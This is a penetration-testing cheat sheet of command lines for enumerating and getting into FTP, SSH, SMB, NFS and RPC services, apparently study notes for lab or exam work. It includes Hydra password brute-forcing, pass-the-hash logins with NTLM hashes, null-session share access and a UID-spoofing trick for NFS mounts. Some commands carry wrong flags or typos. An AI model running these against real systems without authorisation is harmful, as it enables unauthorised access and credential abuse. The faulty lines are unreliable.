# FTP - Port 21
Check for anonymous access 

Check if we can upload files

Download files from ftp - wget -r ftp://user:pass@IP

# SSH - Port 22
1. SSH ID RSA Gen and connecting
- ssh-keygen -f ./authorized_keys -t ed25519
- ssh -i id_rsa USER@IP

2. Type ~C to get into ssh command mode from ssh session
- To do port forwarding from BOX to kali while we are on ssh session in kali ssh `-L  9999:localhost:9999`
	
3. SSH bruteforce with Hydra
- hydra -l root -p admin 192.168.1.105 -t 4 ssh
- hydra -L /usr/share/wordlists.rockyou.txt -P /usr/share/wordlists/rockyou.txt -M Documents/ip.txt -t 4 ssh

4. SSH port forward while we are in session (Not working)
- ~C			  - Goto Command line
- -D 1080	          - Forward 1080 port
- Use proxychains to 1080	

5. SSH port forward
- ssh -D 1080 -L4443:127.0.0.1:443 -L8080:127.0.0.1:80 user@ip

# SMB

- smbclient -d DOMAIN -u user -p 'PASS' -H IP 
- smbclient -d DOMAIN -u user -p 'PASS' -H IP  -R SHARENAME

### To get a shell with windows cerds
- Login with Evil-Winrm `evil-winrm -i IP -u user -p pass`
- Login with Psexec
- Login with winexe
- Login with impacket tools

### To get shell with NTLM Hashes
- pth-winexe -U user%NTLM_HASH //10.10.10.10 cmd.exe

### Enum
1. Nmap
- `nmap --script smb-enum-users.nse -p445 192.144.106.3`
- `nmap -p 139,445 --script=smb* IP`

2. Shares
- `crackmapexec smb 10.10.10.180 --shares`
- Null Auths
    -   smbclient -U '' -L IP
    -   smbclient -U '.' -L IP
    -   smbclient //ip/share
- List shares
    -   smbclient -L IP 
    -   smbclient -L \\IP\ 
    -   smbclient \\\\IP\\sharename -U username 
    -   smbmap -H IP
    -   smbmap -R SHARE_name -H IP
- Download
    -   smbmap -R SHARE_name -H IP -A file-to-download-from-SmbShare.txt -q
    -   Download all files
      	-  recurse ON
      	-  prompt OFF
      	-  mget *  

 
# NFS
- Enum
	- nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
	- nmap -p 111 --script nfs* 10.11.1.72
	- showmount -e IP
- Mount
	- mount -o nolock 10.11.1.72:/home ~/home/
	- mount -t nfs 10.10.10.10:/share /tmp/share1
	- mount -t cifs -o 'rw,username=guest' //10.10.10.10/data backups
	- mount -v //192.168.56.103/anonymous /tmp/mounted
	- Add a new user and change the user-id in /etc/passwd

# SAMBA
- nmblookup -A IP 
- nbtscan IP
- Change password of user if we know creds of username
  - smbpasswd -U username -r relm.local (or) -r IP
 
# RPC
- rpcclient -U username IP
- rpcclient -U '' ip
- rpcclient -U username IP 
